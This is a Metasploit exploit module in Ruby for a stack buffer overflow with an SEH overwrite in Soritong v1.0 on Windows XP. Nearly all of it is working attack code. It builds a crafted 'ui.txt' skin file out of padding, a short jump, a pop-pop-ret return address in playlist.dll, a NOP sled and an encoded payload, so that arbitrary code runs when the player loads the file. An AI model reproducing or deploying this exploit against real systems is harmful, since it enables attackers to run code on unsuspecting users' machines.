Soritong v1.0 Universal BOF-SEH (META)
======================================

##
#Metasploit version by FB1h2s,Orginal exploit by skull_haxor
#And greetz to corelanc0d3r team for all there cool tutorials, #espesialy the Unicode one :)
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of #use.
# http://metasploit.com/framework/
##
  
require &#039;msf/core&#039;
  
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::Seh
  
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;Soritong v1.0 Universal BOF-SEH (META)&#039;,
            &#039;Description&#039; => %q{
                This module exploits a stack overflow in Soritong v1.0
            By creating a specially crafted skin ui file making it possible to execute arbitrary code.
            Just replace the skin file with the new one.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; => &#039;FB1H2S&#039;,
            &#039;Version&#039; => &#039;Version 1&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/8624&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 1000,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;DisableNops&#039; => &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Windows XP Universal&#039;, { &#039;Ret&#039; => 0x1001E812} ], # pop pop ret - playlist.dll
  
                ],
            &#039;Privileged&#039; => false,
            &#039;DefaultTarget&#039; => 0))
  
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;ui.txt&#039;]),
            ], self.class)
    end
  
  
    def exploit
  
        sploit = "A"*584
        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
        sploit << [target.ret].pack(&#039;V&#039;)      #universal
        sploit << "\x90" * 20                # nop sled
        sploit << payload.encoded
        sploit << "\x90" * 1000              #nd another few
  
        playlist = sploit
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(playlist)
  
    end
  
end



